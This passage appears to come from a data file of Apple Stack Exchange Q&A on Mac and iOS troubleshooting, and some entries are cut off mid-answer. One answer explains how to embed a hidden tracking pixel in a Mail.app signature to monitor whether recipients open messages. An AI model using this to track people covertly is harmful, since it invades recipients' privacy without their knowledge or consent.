and off, which proves my hypothesis is correct. However, I have no idea what this is happening and how I can stop it.\nAny ideas?\n\n\n\nA: It might your keyboard issue which is just a random guess. However before going on hardware, why not you try to reset SMC. \nThe System Management Controller — or SMC — is responsible for various pieces of hardware inside your machines such as the battery, fans, logic board and more. \n\n\n*\n\n*The SMC is even responsible for recognizing when certain buttons are\npressed.\n\n\nYou can take the guidance from https://support.apple.com/en-us/HT201295\nIt doesn't hamper anything so I think it is worth to try. \n", "Q: macOS launchpad icons became blurry macOS launchpad icons became blurry as compared to those in the dock.

I can still send/receive messages when I'm out and about, and I'm not leaving data turned on and thus chewing through it quickly (and have it available if I need it, such as for driving directions).\nNow, here comes the part I don't understand. Although I'm connected to my home network almost the time, much to my surprise, when I do turn on data, I get a number of queued messages. They all seem to be group messages, and show up in grey in Messages.app. [These groups may have been created before I switched off iMessage, if it makes a difference]\nThis is unbelievably frustrating.

Why are they only available when I turn on ridiculously expensive cellular data?\nMore to the point, is there a way I can get them to come over WiFi, so I don't miss them and don't pay extra for them?\n\nA: A one-to-one text message uses SMS. A group message uses MMS and this requires data. You would likely have the same issue if someone texts you a picture directly as this also uses MMS.\nCheck with your service provider though, as some include picture messaging (i.e. MMS) for \"free\" and don't count it as data.

I use losetup and cryptsetup to create a loopback encrypted file system.  Is it possible to do the same on Mac OS X?  If so, how?  \n\nA: I had to Google what a loop device was before I understood the concept… \nWould .dmg (Apple Disk Image) files not be an adequate substitute? They can be expandable & encrypted, using FileVault. Once mounted they behave like any other mounted volume.\nFrom Wikipedia - Loop Device\n\nMac OS X implements a native image mounting mechanism as part of its random access disk device abstraction. The devices appear in /dev as regular disk devices; reads from and writes to those devices are sent to a user-mode helper process, which reads the data from the file or writes it to the file. In the user interface it is automatically activated by opening the disk image. Mac OS X can handle disk (.dmg or .iso), CD-ROM or DVD images in various formats.\n\n", "Q: Restored iPhone from iTunes backup - where's all the iMessage storage that was previously used? iPhone 7 Plus running iOS 12.4.1.\nDevice showed the following iMessage statistics under iPhone Storage:\n\nI took encrypted backup using iTunes on Windows, then restored that backup (also to 12.4.1).

What would account for the substantially lower storage numbers afterwards?\nUPDATE: I am convinced that all of the photos and videos reflected in the \"before\" screenshot are still present on the device (despite Messages in iCloud being on), yet for some reason the Messages storage page simply isn't reflecting the usage for some reason.  The reason I believe that the media is still present on the device is because when I back up the iPhone via iTunes and then use any number of 3rd party tools to inspect the backup, all of the photos and videos are there.\n\nA: I updated iOS* and the screens shown in the screenshots above showed the results I expected; that is, they showed storage amounts consistent with those prior to my restore.\nI suspect that the upgrade forced the statistics to be updated.\n*The upgrade was to iOS 13.1 but my gut feeling is that any upgrade would have \"resolved\" the problem.\n", "Q: Force removing items from Trash I deleted a user folder from Macintosh HD/Users that was inactive.

My old workhorse 17\" MacBook Pro (circa 2011) finally gave up the ghost after 8 years of reliable service (may it rest in peace), and I'm looking into a 27\" iMac to replace it.\nI want to buy the high-end model iMac with the fusion drive and make the following upgrades:\n\n\n*\n\n*Replace the 128GB SSD with a 1 or 2TB SSD.\n\n*Replace the 3TB spinning HDD with the largest SATA drive that will physically fit inside the case (hopefully a 12 or 16TB drive - I need lots of storage).\n\n*Ditch the Fusion Drive setup in favor of two independently formatted internal drives.\n\n\nI understand that this is complicated surgery for this model and I have the skills necessary to perform the work.  But since my previous machine is so old, I am a bit out of the loop on newer Apple hardware.  I know that Apple was using proprietary connectors for their SSDs a few years ago (they were first to market with PCIe-based SSDs before the NVMe spec was finalized in the PC world).\nSo my question is, does the onboard PCIe SSD connector on the 2019 27\" model conform to one of the industry standard M.2 form factors, or does Apple still use their own proprietary blade-style SSD connectors?\nAlso as a bonus, what is the maximum height clearance for the 3.5\" SATA hard drive bay?\n\nA: These models support a 7 mm tall SATA III (6 Gb/s) hard drive for the primary storage (using the 3.5\" size as opposed to the 2.5\"), and getting the Fusion drive means you'll also get what's called a small \"blade\" SSD via a PCIe connector. Without this you can't attempt what you're wanting to do.\nSo, in summary:\n\n\n*\n\n*Primary storage uses a 3.5\" 6 Gb/s SATA 3.0 connection\n\n*Secondary storage uses a NVMe PCIe \"Blade\" connection\n\n\nHowever, getting a compatible \"Blade\" SSD is not as easy as walking into any computer store and buying one. You will need to purchase one from a vendor that specialises in Mac hardware to ensure you get what you need.\nI haven't actually seen inside a 2019 model 27\" iMac yet, so can't give you a definitive answer in terms of height clearance. \nRecommendation\nBefore biting the bullet and ordering one of these machines, I would take a look at the following to ensure you can get what you need and also do what you want. \n\n\n*\n\n*How to Upgrade or Install a SATA Drive (SSD or HDD) in the Main Drive Bay of a 27-inch Apple iMac (2012 - Current)\n\n*How to Upgrade or Install a PCIe SSD in a 27-inch Apple iMac with Retina 5K Display (2019)\n\n*OWC Solid State Drives For iMac 27-Inch (Late 2013 - Current)\n\n*OWC Complete Hard Drive Upgrade Kit Including Tools for all 27\" iMacs 2012 & Later\nSince you have the skills necessary to perform this upgrade, I would focus on ensuring you can actually get a compatible SSD with the storage you need.\nNOTES: \n\n\n*\n\n*For something like this I also recommend contacting OWC to discuss your requirements.\n\n*There would be no need for you to get the 3TB capacity Fusion drive in order to be able to do this, unless you want that capacity for whatever you intend to do with it later.\n\n\nDisclaimer: I have no affiliation whatsoever with OWC.\n\nA: Yes, Apple is still using proprietary SSD connectors as of 2019.\nI purchased the 27-inch 2019 iMac with the Fusion Drive option and it contains the following for internal storage connections on the logic board:\n\n\n*\n\n*1x proprietary Apple SSD \"blade\" connector.\n\n*1x proprietary SATA power connector.\n\n*1x industry standard SATA III data connector.\n\n\n\nTo upgrade the SSD:\nI needed to purchase an adapter to connect the 2TB Samsung EVO Plus I ordered.  The adapter I received had no electronics on the board whatsoever, so apparently Apple's proprietary connector is just a standard NVMe connector with different pin layout (although it might have other functions in other models).\nNOTE: The SSD connector's position on the logic board only gives 5mm of clearance with the iMac's tapered aluminum body!  If you're going to use a heat sink on your SSD (which is highly recommended for the SSD I bought -- it runs HOT), you MUST use a low-profile heat sink.  The first one I ordered was 7mm tall and it didn't fit.\n\nTo upgrade the HDD:\nI was able to use an ordinary 3.5\" 16TB SATA III desktop hard drive without issues.  The drive bay is nearer to the center of the iMac's body so it has much more clearance.  The drive I ordered was 12mm high (which is pretty thick), but it fit just fine with room to spare.\nNOTE: Even though the SATA data header on the logic board is standard, the power header is not.  Connecting a standard SATA drive requires the use of a proprietary cable for getting power to it.  The Fusion Drive models obviously include the cable, but I don't know if non-Fusion Drive models come with one.\n\nI am happy to report that after putting everything back together, it runs like a champ.  I've put this machine through some stress testing over the past couple months and have encountered no issues whatsoever.  Fans run at normal speeds, and the SSD temps barely go above 50°C.\n", "Q: How is iOS updating all my apps without permission? iPad is at iOS 12.3, iPad is WiFi only. iPhone is at iOS 12.4.\nBoth have got automatic download and updates turned OFF in settings → iTunes and AppStore. Yet in the last weeks both devices, without intervention or permission have updated every single App. This has resulted in ADS (apple disorientation services), where I have to login to apps again with passwords I haven’t used for years, and everything’s looking different and working differently. How has this happened? \nI do iOS updates for security, but if my App ain’t broke I don’t wanna fix it. How do I stop this app auto-update feature on my iOS devices? \n\nA: FWIW, this just happened to me. Had auto updates turned off, kinda freaked me out. Turned out, in my case, I had enabled “offload unused apps” to free up space - got a feeling this might be why all my apps needed re-downloading. Not sure if “re-downloading” == “upgrade”.\n", "Q: How to send a template message in iMessages on iOS? I receive multiple questions a day on my iPhone and need to send the same reply to them. If my phone is on and open and I read the text, is there a way to send the same reply with out having to type it out?\n\nA: You could experiment with using the Text Replacement function in Settings > General > Keyboard. While in iMessage, type the shortcut to spool out the replacement text. It was able to hold quite a lot of text to spool, too.\n\n\nA: Welcome to Ask Different! I know of no way to do this internally in imessage. A workaround, which you may have already considered, is to open the notes app and leave it open to a new note page. Every time you reply to a text message just copy it and paste it in the Notes page. Now whenever you receive the same message, you can copy and paste from Notes. This is probably more work than you want for short replies but if your replies are many lines long this would help a lot.\nSomeone else may answer this question with a better answer but in case they don't you have an easy workaround.\n", "Q: Mac Mail deleted an entired thread of emails without my consent This never happened to me before but yesterday I had a big thread of emails open on my Mail app (~60 emails) and I don't know how but today they're gone.

I've just arrived home to see if my sleeping MacBook hadn't synced in the meantime, but it turns out it does even in sleep mode.\nI don't have Time Machine enabled and don't do backups of my Mac because I have everything on iCloud.\nDoes anyone know if there is some kind of internal trash / cache or any other place I can search for this emails?\nThank you\n\nA: Don't know what your current settings are, But for future safety, in mail → preferences → accounts → mailbox behaviours, keep trash mails for a month. In case they were deleted by an inadvertent action. \nIf there were a backup, ~/Library/Mail/Vx (where x is a number) would have the mails. You can try though.\nYou can also ask your IT department(if any) to check in their backups.

I checked my accessibility and it was already set to voice control off. I dug a bit further and there is a second section, customize commands > that has multiple options. At the bottom of the list is “accessibility “. When you tap that, more options are listed.  One of them says “Turn off voice control” and the button is either on or off. Mine says off. When I tap “off” it doesn't turn it back on but takes me to yet another screen of options. “Enabled” and ”Confirmation required”. I think this has more to do with commanding my phone by voice than by dictating text to Siri. \nThe only item I don't get is how to eliminate Siri\nDictation duplication in practice so we don't need these workarounds and half measures.\n", "Q: How to show newly added books in iBooks on iPad? I use an iPad mini 4 as an ebook reader to read PDF books. I don't know if it's because of my stupidity or else, I feel iPad is many times harder to use as an e-reader than an android tablet, it has caused me many headaches in doing things as simple as transferring or syncing books. I often have the thought of ditching the iPad and getting an android tablet instead but my thrifty nature always wins.\nI have many books on iPad, and I use collections to manage books in the iBooks app. A problem has harassed me for a long time: when I add a new book to iTunes, sync it to iPad, and try to move it to a collection, it is very hard to find the newly added book on iPad. It is buried in a list of hundreds of books. There is no \"not in any collection\" category. I searched Google many times for a simple solution but without success.\nWhere do I find newly added books in iBooks app? \n\nA: I don't know what iOS version you're at but there is a sort by feature in Books.app in iOS 12. Also, most of the collections also allow you to sort. I normally put them in Want to Read for quick access. \n\n\n\n\n", "Q: How to auto select new screen when moving pointer from one monitor to another? I use Chrome browser on extended display, and its DevTools on built-in monitor. Both are using their own spaces in separate monitors. \nMy problem is when I move pointer from one monitor to other one I cannot click link immediately... I need first one click to select that screen/app and then secondary click is actually following the link. \nReally annoying. So I'm looking how I could set up pointer when it moves from one display to another to automatically selects its current space.\nIf it's not possible from built in options, is it possible to be done through some script ?\nHelp appreciated.\n\nA: This is one of those paradigm shifts that really irritates Windows users & Mac users usually are just so used to it they either forget it happens, or prefer it because it's never 'dangerous' in that the first click can't accidentally trigger an action, it just foregrounds the app.\nOf course, the other way round, Mac users are constantly clicking & actioning things on Windows when all they wanted to do was simply foreground the app ;)\nThere is an override behaviour which you may be able to use on occasions, but I know of no way to permanently change what is core behaviour on macOS.\nIf you hold  Cmd ⌘  as you click in a backgrounded app, you should be able to act on a button or element without bringing the app to the front.\nOf course, if you need more than a simple click action, you will have to foreground the app eventually.\nOn the upside, you never have to foreground an app to scroll a window; merely hovering the cursor over it is sufficient to focus the scroll action.\n", "Q: Should I delete an old Photo library having created a new one? Have just created a new Photos folder as the old one was failing to download recent photos from the cloud.\nWith the new library working fine, should I delete the old (I think there are two or three) one to avoid further conflict?\n\nA: It's unlikely that there will be any conflict as Photos will pick the new one by default.

Your app is currently submitted under an individual account that reflects your name, “AMAN ULLAH TANVEER.” To comply with section 5.2.1 of the PLA, your app should be submitted by an account that reflects \"Saifee Hospital Karachi.”\nTo request an update to the company name or entity type associated with this Apple Developer Program account, the Team Agent will need to contact Apple Developer Support to request an update to the company name. On the Contact Us page, select \"Membership and Account,\" then \"Organization Name Change\" to make this request\n\nI then asked Apple to change my account type from individual to company. Apple reject my appeal by saying you are not the founder of XYZ company.\n\nThank you for contacting Apple Developer Program Support regarding migrating to an organization membership.\nWe are unable to proceed with the migration because you do not meet our migration requirements:\n• The owner of the individual account must be the founder or cofounder of the organization.\nThough only founders or cofounders are eligible for migration, your organization can enroll\nseparately into the Apple Developer Program. After the enrollment is complete, it is possible to transfer apps to the organization membership. See the App\ntransfer overview for details.\n\nWhen asked for a refund, Apple denied by saying the developer program fees are non-refundable.\n\nI apologize for the inconvenience you may have experienced, unfortunately we are unable to process this credit due to our no-refund purchase terms. You can view these terms within\nthe Program License Agreement located in Membership > Show Agreements at the Apple\nDeveloper website.\n\nWhen asked apple if I change the name of my application to something generic removing the words \"Hospital\" from it\n\nThank you for contacting the App Review Board. However, changing the name of your application does not resolve the 5.2.1 issue. Since your app is specifically for a medical institution, it should be submitted under an account that reflects the name of the medical institution.\nPlease refer to our previous correspondence for details on how to resolve the issues we identified during our review. It would be appropriate to revise your app to ensure it is compliant with our guidelines prior to resubmitting it for review.\n\nCan someone explain who needs to apply for the developer program?\nIs my money totally lost?\n\nA: I think you have some things mixed up:\nThe developer agreement is between Apple and the seller of the app (free apps are also regarded as being sold on the App Store). It is not between Apple and whomever actually makes the app.\nIf you're an individual making and selling an app, you need an \"Individual\" account with Apple. The name of the seller on the App Store is then your given name. The name of the app itself can be anything - it doesn't have to be your name.\nIf you're working for a corporation developing an app to go on the App Store, the corporation needs a \"Company\" account with Apple. This agreement can be made by anyone authorized to sign the documents for the company - for smaller companies this is usually the director. This also applies if you're both the developer, owner and director of the company.\nIf you're developing an app for a client and they're going to release it on the App Store - then that client needs to enter the agreement with Apple. Either as an Individual or as a Company depending on who your client is. You yourself needs no agreement with Apple at all.\nIn your specific case, the app is not going to be sold by you - rather it is going to be sold by your client - the hospital. Therefore the hospital needs to apply and enter into the Apple Developer Program. When they have done that, they can create a user account for you with developer access, so that you can upload the app for approval by Apple.\nThe specific part of section 5.2.1 that you're in violation of is:\n\nApps should be submitted by the person or legal entity that owns or has licensed the intellectual property and other relevant rights and is responsible for offering any services provided by the app.\n\nTherefore it does not matter that you state that you have agreements with the hospital that you are allowed to use their name, trademark, logo, etc. The app needs to be submitted by the entity providing the service - not by the person that happened to be doing the actual coding.\nYou can make a second plea to Apple stating that you didn't know that you weren't supposed to enter an agreement at all - but if they already explained to you that it is non-refundable, there's really nothing you can do. It is explained up front by Apple who needs to enter in an agreement and pay the fees, so it was your responsibility to figure that out before ordering and paying.\n\nA: Based on the feedback you got, Apple is stating you've violated section 5.2.1 which deals with intellectual property rights.\nThe applicable part of this section is:\n\nApps should be submitted by the person or legal entity that owns or has licensed the intellectual property and other relevant rights and is responsible for offering any services provided by the app.\n\n\"Saifee Hospital, Karachi\" is the legal owner of their trademark and images.  I'm guessing that you've included the trademarked image of this hospital in your app.\nBecause you're not the owner of that trademark, Apple is stating that you're improperly using something that's trademarked and you're not the trademark holder (because the developer name is not the registered owner of the trademark).\nTo get past this, you need to either get permission from the trademark owner or remove those trademarked items from your app.\nYou will probably not get a refund because of an error on your part.  This is fair to both Apple and the owner of the trademark.  You have options available to you to move past this problem.\n", "Q: Image problem : Can't Open with... Preview On Mojave 10.14.6, selecting jpgs on a server but I can't use Open with... > Preview\nPreview is the default app for jpgs, and 'Open with' is working fine with other file types and apps.\nAny idea what's the cause and fix?\n\nA: There are two possible issues at play here.\n\n\n*\n\n*The first is a file association issue. If you right-click the file, and choose Open With, does it show Preview (default) at the top? If not, then it's a file association issue.\n\n\n\n\n\n*The second is either a) file permissions issue; or b) corrupt file. For instance, you may be able to view the file listing on the remote share, but not actually access the file itself. To verify that either of these issues are not a concern, copy the remote file to your Desktop and try to open it locally. If you get an error copying the file, then you know it is a file permissions/accessibility issue. If you can copy it, but it fails to open properly in Preview, then you just have a corrupt file.\n\n\nA: Delete the following folder from your Library of the user.

My Macbook Air cannot connect to LAN internet. At the network preferences tab, it showed that my USB LAN has a self-assigned IP address and will not be able to connect to the internet. The network status showed 'CONNECTED' but below, it mentioned about the self-assigned IP address. What is it about?\nI tried to look for a solution via google but I check my system preferences that my Macbook Air does not have this folder called 'library' where I could delete some of the un-used file or un-wanted file from my Mac. How can I solve this because I really need to use the internet when I have to pay the internet bill every month for my student residence. I have asked my friend from the residence but they also don't know how to deal with it.\nIs my Mac is not the original Macbook that does not have such a folder?\nI am just worried. I am sorry that I am not a tech-savvy person. \n\nA: Your title does not seem to have anything to do with your actual question, you should change that.\nThere are a number of \"Library\" folders on your Mac, but the only one you should ever go into is actually hidden, meaning that Apple (for all intents and purposes) recommends you stay out of it. \nWhy? Because deleting things in your users Library folder without knowing what these files do could cause more than a few things on your Mac to stop working.\nIf you just need to do some clean-up and delete unneeded files I recommend using a utility like Onyx (I use it, there are others that do similar things). And that will clean up the unneeded (cache and temporary) files for you, safely and easily.\nIf you want to go exploring though you can view  your Library folder by holding the Option key down while selecting the Finder's \"Go\" menu. \"Library\" will show up in the list and then all you have to do is select it to open a Finder window to explore.\nBut, again, be careful deleting things. If you do not know EXACTLY what a file is or does leave it alone or you could cause problems with your Mac, one or more of your Apps or numerous other things could stop working.\n\nA: Simply press CommandShift . . to see the hidden folder, your Library is there under your user folder. \nI suggest you read the proper site who is suggesting you delete the files of Library. It is good and helps to fix after deleting but it might hamper your macOS too. \n", "Q: Do prices of older iPhones decrease after the release of a new model? I want to buy an iPhone 8. However, in a few days new iPhone 11 will be released. Can I expect older models to become cheaper at that moment or soon afterwards? Or does the price drop happen before the release?\nSince shopping questions aren’t encouraged here - the scope of this is official Apple list price - historical behaviors, and not speculation about some future Apple release cycle even if one is imminent.\n\nA: During the iPhone 11 announcement, Apple said they were reducing the price of the iPhone 8 to starting at $449 and the iPhone XR to starting at $599. These price changes are currently effective on Apple's website.\nHistorically, Apple announces new models and pricing and at the same time, refreshes their official pricing the same day as the keynote / press release. Additionally, look online and at Apple stores as they then sell (often at further discount) any now “discontinued” models in the Certified Refurbished / Clearance section: \n\n\n*\n\n*https://www.apple.com/shop/refurbished\n\nA: Apple typically announces new phone models in September. The new phone models usually take the spot at the high end of Apple’s pricing structure and the last one or two years of models slide down in price to become the “low cost” iPhone options. The pricing change occurs right as the new iPhones are announced, even if the new phones won’t ship for another month or two. \nHere in 2019, Apple just announced its new phone lineup last week. iPhone 8 now sits at the bottom of the pricing structure. The price adjustments have already been made for this phone release cycle. \n", "Q: Why is wc -c printing spaces before the number? command: \necho \"test\" | wc -c\n\nresults (7 leading spaces):\n\"       5\"\n\nI tested this on my linux box and I don't get the space in front of the five. is this a bug or expected behavior?\n\nA: I find this solution to be more portable in various situations, since I really just want the number of \"lines\" more often than not.\necho \"test\" | awk 'END{print NR}' which returns 1\nThis post has additional information on POSIX implementation https://unix.stackexchange.com/a/205910\n\nA: This is by design.

How can that be done? I am scrolling using the mouse wheel. Thanks!\nNote: I am talking about zooming, not about scrolling (the later one can easily be changed in the Mac OS options).\n\nA: Logitech Options can reverse the scroll direction on a per app basis - however it reverses the entire scroll action, not just the zoom direction.\nTop right, select the App you want to affect, then select Standard or Natural in the Scroll Direction drop menu.\n\nIf you have an older [or just less darned awkward than my MX2] mouse that doesn't use Logitech Options, you may be able to achieve better results with something like SteerMouse which can do most tasks on a per app basis, including Zoom…\n\nUntil recently, SteerMouse & Logitech Options would fight each other badly, yet SteerMouse couldn't see all of the buttons on my MX2 properly, so I've been stuck with Options for a while & cannot test SteerMouse in this instance.\nEdit: Tested again 19 Sept 2019 - they still fight each other & SteerMouse can't use the Gesture button properly, so I'm still on Options.\n", "Q: Which graphics applications work with Intuos3?

I have a Yosemite host and Mojave guest VM via Virtualbox. I want to share the host's folders with the guest. I'm aware there are at least three ways but I haven't been successful with any of them. I'm not an expert and it took a while just to get Mojave as a guest on Yosemite after several failed attempts with Parallels 10. The three ways I'm aware of are:\n\n\n*\n\n*Guest Aditions: I've installed Guest Additions and I've added directories in the Virtuabox's \"Shared Folder\" settings. However, I can't seem to find the shared folders in Finder in Mojave - they should just show up under a shared network file no?\n\n*NFS Manager (https://www.bresink.com/osx/NFSManager.html)\n\n*or setup a Mac server by configuring mac settings via the file sharing section.\n\n\nWhich is the best/easiest way (from the above or from other ways) and is there a video/step-by-step guide about it?\n\nA: AFAIR the guest additions's sharing feature doesn't work for the macOS varieties. On the other hand none of the mentioned options is necessary to get file sharing running.\nThe only thing needed is a proper network connection.\nThe most simple configuration: using the physical NIC of the host as bridged device in the guest. If the physical NIC is already connected to the internet, you don't even have to set up a NAT-network to get internet in the guest.\n\n*\n\n*Shut down the guest\n\n*Open the config window of the guest in VirtualBox\n\n*Chose network > adaptor 1\n\n*Choose Bridge and the appropriate physical NIC of the host (usually en0 or en1) and hit the OK button\n\nNow start the guest machine.\n\n\n*Open System Preferences > Network > bridged NIC on the host and make a note of the network settings (e.g. IP: 192.168.0.2/Mask: 255.255.255.0/Gateway: 192.168.0.1 DNS:192.168.0.1).\n\n\n*Open in the guest: System Preferences > Network > only NIC available which usually has a similar name as the physical NIC of the host (e.g. Ethernet - the interface name (en0, en1, etc.) may differ though).\nEnter a different IP in the same network (e.g. IP 192.168.0.12). The rest stays the same (255.255.255.0/192.168.0.1 DNS:192.168.0.1)\n\n\n*Create a folder to share on the hosting Mac.\n\n\n*On the host switch to System Preferences > Sharing, enable file sharing, hit the +-sign and choose the folder created in the previous step.\n\n\n*In the guest open in the Finder > Go > \"Connect to Server...\" and connect to the hosting Mac with the proper IP (e.g. smb://192.168.0.2) and credentials.\n\nThis common approach didn't work out for the OP for unknown reasons. So things were reversed and a folder in the guest was shared. On the hosting Mac open in the Finder > Go > \"Connect to Server...\" and choose the IP of the guest (e.g. smb://192.168.0.12) and log-in with the proper credentials.\nThis worked after adjusting the time of the hosting Mac (it was off for ~8 minutes and Kerberos doesn't like this - server and client time should be in sync; AFAIR 5 minutes difference is acceptable).\n", "Q: Re-install Python on macOS I uninstalled Python on my Mac by moving all python-related files in my Mac (including system files) to the trash and emptying the trash.

This will try and run diagnostics from the internet instead, so you will need to allow more time for it to complete. \nIf after doing all of the above you still have no joy, then it's time to contact Apple directly.\n", "Q: What's the maximum length of a SIM card PIN that iOS supports? I've seen conflicting information on this, so was wondering if somebody could help clarify.\nGenerally, whenever I've seen references to setting a SIM PIN on an iOS device, articles/instructions suggest a length of 4 digits are used - however, I've seen elsewhere that up to a maximum of 8 digits can be entered. Taking the above into account, what's the maximum length that can be used with a SIM PIN in iOS?\n\nA: The SIM PIN has a minimum of 4 digits and a maximum of 8 digits.\nThis goes for the iPhone, all iOS devices - and indeed any other standards compliant GSM cellphone.\nFor the latter statement, please consult this standards document:\nhttps://www.3gpp.org/ftp/TSG_T/TSG_T/TSGT_05/Docs/PDFs/TP-99185.pdf\nFrom page 66 and on, the PIN functionality is documented.

It's the only Mac we have.\nWe just managed to buy a newer version of the hardware. It's tools are modern and can run on 10.14 without issue. However that older hardware will be moving to another room to be used elsewhere so we still need to interface with it to configure it. The older tools don't support the new hardware and can't run on 10.11 or above, the newer tools don't support the older hardware and require \"a modern version of MacOS\" (the developer recommends 10.14, doesn't say anything about previous versions).\nA VM is not an option as there isn't the ability to do FireWire passthrough to a VM with the ThunderBolt to FireWire adapter.\nMy plan is to dual-boot the machine with a 10.14 install and a 10.10 install. To configure the new hardware, boot to 10.14. To configure the old hardware, boot to 10.10.\nMy worry is that running the 10.14 installer will upgrade firmware on the machine to a version that is incompatible with 10.10, and thus the dual-boot would not work.\n\nA: I haven't heard about such incompatible firmware updates. \nI have dual-booted 10.14 (Mojave) and 10.11 (El Capitan) on the 2013 Retina MacBook Pro, which is almost the same configuration - and that worked without problems as far as I recall.\n", "Q: Formatted APFS in Mojave shows file format in system report as MS-DOS just fitted an ssd to my Mac Pro 5.1 Mojave enabled, working ok but when I looked at the system report it says the file system is ms-dos, is this a problem? the only option I had for formatting the ssd in disk utility was APFS which I chose\n\nThanks Ted\n\nA: Everything is fine as the EFI volume is supposed to be formatted MS-DOS FAT32, and as you can see your disk0s2 volume is as should be Apple_APFS.\n", "Q: Does SuperDrive read 8GB DVDs?

Have 13\", 2017 Macbook Air currently with Mojave OS. Is an SSD with \"Ultra-Fast PCIe NVMe Gen3x4 Interface\" (for example recommended SSD from Tom's Hardware) likely to be compatible with a Macbook Air if I use a physical adapter designed to handle the Apple proprietary blade configuration to the M.2 blade standard \"conversion\" (e.g. Sintech NGFF M.2 nVME SSD Adapter Card? I'm wondering whether the PCIe 3.0 protocol on the board is going to be backward compatible with the PCIe 2.0 that the MBA uses.\nI found a similar question, but I thought the answer was specific to that questioner's situation, since the suggestion to use a USB access to format an M.2/PCIe board would require an extra enclosure. I'm pretty sure the more general answer would be to construct  a bootable USB stick and format the board once it's in the computer (and that's not really my question, since I found lots of instructions on how to do that.)\nNote: thought PCIe would be a reasonable tag but my low rep on this forum prevent creating a tag.)\n\nA: Yes, it is likely to be compatible - however there are (ofcourse) no guarantees.\nAccording to the manufacturer of the adapter, they have tested that specific SSD with the adapter - so that sounds reasonable.\nI would consider using this specific adapter from the same company:\nhttps://www.amazon.ca/dp/B07FYY3H5F/ref=dp_cerb_3\nIt is listed as supporting your SSD.

Are the observations you have cause for concern - not really.\nmacOS contains a feature named \"Power Nap\" which allows the Mac to wake itself up from sleep to perform routine activities for a short while, and then go back to sleep. This is stuff like receiving new emails, syncing calendars and iCloud documents - or when connected to a charger - downloading software updates, taking backups, etc.\nYou can read about the feature here:\nhttps://support.apple.com/en-bn/HT204032\nRegarding SSH remote host identification changed: You'll need to contact the owner/administrator of that host to confirm whether or not the remote host identification change is a problem or not. It can happen for completely benign reasons such as reinstalling the computer, changing SSH configurations, etc. \nIn addition, it doesn't mean that your computer has been hacked. Rather it means that someone could be tampering with the remote computer or the network in between.\n", "Q: How to fix bluetooth problem? I'd like to connect my bluetooth headphones to my computer.

However, Apple doesn’t mention any negative consequences of resetting the SMC, nor any way to determine for sure if the SMC is glitchy without resetting it and noticing that the problem went away. I’ve reset my Macs’ SMCs many times with no apparent ill effects, and on the occasion that did, in fact, turn out to be the solution to a problem.\nHow to do SMC Reset\nShut down and unplug your Mac.

Can an individual add their own tracking pixels to, for example, their email signature and have this be effective in a mail client that doesn’t offer read receipts? Like Apple Mail or Spark, for example? \nIf so, how does one do that?\n\nA: You can add HTML img tags (linking to your tracking pixel) by manually editing your Mail.app email signature files. Of course these will only work if the recipient's email client loads remote images.\nSignature Location\nThe .mailsignature files will be in one of two locations depending on whether or not the email using the signature is an iCloud account.\nIf the account is an iCloud account, the .mailsignature files can be found here:\n~/Library/Mobile Documents/com~apple~mail/Data/MailData/Signatures/\nIf the account is not iCloud, the .mailsignature files can be found here:\n~/Library/Mail/[Vx]/MailData/Signatures/ (where [Vx] is a version dependent on your current install, in Mojave mine is V6).\nEditing .mailsignature Files\nYou may want to create a new signature (and associate it to your desired account). It will then show in these folders as the most recently modified .mailsignature.\nEdit this file in a text editor that can view the HTML code (replace anything in the  tags below the \"Mime-version: ...\" line).\nFor the simplest example, your file could look like:\nContent-Transfer-Encoding: 7bit\nContent-Type: text/html;\n    charset=us-ascii\nMessage-Id: <C29....>\nMime-Version: 1.0 (Mac OS X Mail 12.4 \\(3445.104.11\\))\n\n<body><img src=\"http://www.example.com/tracking_pixel.jpg\" /></body>\n\n\nImportant Note for non-iCloud Accounts\nIf you're not using an iCloud email account, you MUST lock the .mailsignature files after editing, or they will be overridden.\nUsing the .mailsignature Files\nOnce you've edited the .mailsignature file, quit Mail and reopen. You can now select the .mailsignature you edited. \nNOTE: Images from  tags will not appear in either the compose window or in the Signatures tab of Mail preferences, but they WILL appear in messages you send (if the recipient loads remote images).\n", "Q: What does MacOS actually do when open a file?

This code is responsible for launching applications and providing those applications with the details of files to open or print:\n\nLaunch Services is an API that enables a running application to open other applications or their document files or URLs (uniform resource locators) in a way similar to the Finder or the Dock. Using Launch Services, an application can perform such tasks as:\n  \n  \n*\n  \n*Open (launch or activate) another application\n  \n*Open a document or a URL in another application\n  \n*Identify the preferred application for opening a given document or URL\n  \n*Register information about the kinds of document files and URLs an application is capable of opening\n  \n*Obtain appropriate information for displaying a file or URL on the screen, such as its icon, display name, and kind string\n  \n*Maintain and update the contents of the Recent Items menu\n  \n\nAEOpenDocuments\nTo open files, graphical applications on macOS are sent AppleEvents of type odoc:\n\nEvent that provides an application with a list of documents to open. Sent, for example, when a selects one or more documents for your application in the Finder and double-clicks them.\n\nThe launched application's arguments do not include the paths of the files to open.\n", "Q: How to increase / decrease a priority of a macOS process? I'm looking for a way to throttle up a macOS application or a process, specifically photoanalysisd. Ideally a Terminal command that would enable it to use all resources to the point, where any other app opened would slow down to a crawl.\nIs that at all possible?\n\nA: A very easy way to change the priority is via htop. It provides the [F7]Nice - and [F8]Nice + commands at the bottom of the Terminal.app window. The buttons can be accessed either via Mouse or via Function-Keys.\nIt also shows a column NI with the current nice-value.\nRunning sudo htop may be required in order to be able to change the nice-value.\nAs mentioned by @jksoegaard, htop is not part of the standard installation, but if you happen to have it installed, it also helps with changing priorities!\nTo install, i suggest homebrew via brew install htop. Note that homebrew is also not part of the standard installation, but can easily be installed via http://brew.sh)\n\nA: Possible duplicate to this superuser question.\nHowever, you may want to read this article.\nHere is the gist you really need to do:\n\n\n*\n\n*Make sure that no malware is running / slowing down your mac.\n\n*In Terminal, identify running processes: ps -ef\n\n*Make sure to close any unneeded resource intensive applications and processes, e.g. check the CPU, Memory, Disk usage at least with Activity Monitor.\n\n*nice (if just launching) or renice (if already running) the desired app, e.g. 'photoanalysisd' to maximum. In Terminal: renice -n \"-20\" -p (put PID of 'photoanalysisd' here)\n\n*renice everything else you still need to be running to minimum. In Terminal: renice -n \"20\" -p (put PID of process you need to de-prioritize here)\nNOTE that the:\n\n\n*\n\n*Max (Requested) Priority = -20 (Minimal value)\n\n*Min (Requested) Priority = +20 (Maximal value)\n\n\nthat may be a bit confusing. \n\nIf all of above fails to produce enough improvement, the following upgrades may be a cost effective solution, if available for your mac:\n1) Switch your HDD or slower SSD to an SSD with the the maximum Link Speed that your mac system supports. (Prior to this, if possible, add a fastest available interface to your system.) The current numbers can be viewed in the System Information app's Hardware > PCI | SATA/SATA Express tabs, as well as other tabs relevant interfaces your system actually has installed. The supported speeds may be available on 